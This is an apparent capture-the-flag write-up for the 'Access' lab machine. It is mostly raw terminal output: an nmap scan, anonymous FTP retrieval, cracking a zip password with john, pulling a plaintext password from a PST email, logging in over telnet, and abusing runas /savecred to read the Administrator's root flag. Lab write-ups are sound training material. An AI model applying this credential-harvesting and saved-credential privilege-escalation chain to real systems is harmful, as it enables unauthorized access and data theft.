## NMAP SCAN 
```
nmap -sSCV -p- 10.129.191.87                                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-07 21:45 +0700
Nmap scan report for 10.129.191.87
Host is up (0.077s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: -5h30m01s

```

lets have a look at FTP 
```
ftp anonymous@10.129.191.87                                                                                                                      
Connected to 10.129.191.87.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  5520 KiB  352.34 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:15 (352.33 KiB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> cd Access\ Control.zip
550 The filename, directory name, or volume label syntax is incorrect. 
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
150 Opening ASCII mode data connection.
100% |***********************************************************************************************************************************************************************************************| 10870        4.00 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:02 (4.00 KiB/s)

```

got files they are password protected... 
```
strings backup.mdb > wordlist
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ls
'Access Control.zip'   backup.mdb   Desktop     Downloads  'HTB BOXES'   ligolo-ng.history   ligolo-selfcerts   Pictures   RunasCs.exe    Templates      Videos           wordlist
 AC.hash               CHISEL       Documents   exploits    impacket     ligolo-ng.yaml      Music              Public     RustHound-CE   timeroast.py   winPEASany.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ john --wordlist=wordlist AC.hash                        

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 10650 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
access4u@security (Access Control.zip/Access Control.pst)     
1g 0:00:00:00 DONE (2026-05-07 22:09) 16.66g/s 66033p/s 66033c/s 66033C/s Standard Jet DB..LVAL
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

got the password, lets use readpst 

```
From "john@megacorp.com" Fri Aug 24 06:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1461061028_-_-"


----boundary-LibPST-iamunique-1461061028_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1461061028_-_-"

--alt---boundary-LibPST-iamunique-1461061028_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-1461061028_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;

```
4Cc3ssC0ntr0ller for security account 
```
telnet 10.129.191.87
Trying 10.129.191.87...
Connected to 10.129.191.87.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security

C:\Users\securitycd
C:\Users\security>cd Desktop

C:\Users\security\Desktop>type user.txt
2d63ec33801c8f096a74bf0f766773eb

```
```
C:\Users\Public>cd Desktop

C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,346,411,520 bytes free

```

interesting ZKAccess
```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                           runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                                                                                                                                                                                                    �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
             O�j)�H���
                      )ΰ[�_���8{E�3
                                   O�j)�H���
                                            )ΰ[�        ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500

```

so it is runas admin... 
```
C:\Users\Public\Desktop>runas /user:ACCESS\Administrator /savecred "cmd.exe /c copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\root.txt"

C:\Users\Public\Desktop>cir
C:\Users\Public\Desktop>cd ..

C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public

05/07/2026  10:59 AM    <DIR>          .
05/07/2026  10:59 AM    <DIR>          ..
07/14/2009  06:06 AM    <DIR>          Documents
07/14/2009  05:57 AM    <DIR>          Downloads
07/14/2009  05:57 AM    <DIR>          Music
07/14/2009  05:57 AM    <DIR>          Pictures
05/07/2026  10:56 AM                22 pwn.txt
05/07/2026  10:14 AM                34 root.txt
07/14/2009  05:57 AM    <DIR>          Videos
               2 File(s)             56 bytes
               7 Dir(s)   3,346,403,328 bytes free

C:\Users\Public>type root.txt
Access is denied.

C:\Users\Public>runas /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Public\root.txt > C:\Users\Public\flag.txt"

C:\Users\Public>type flag.txt
9941272c3fe5b58af546d7effa1d9048
```

so we were able to get the file but was not able to acess it so we changed the filename so we can access it and got the root flag. 
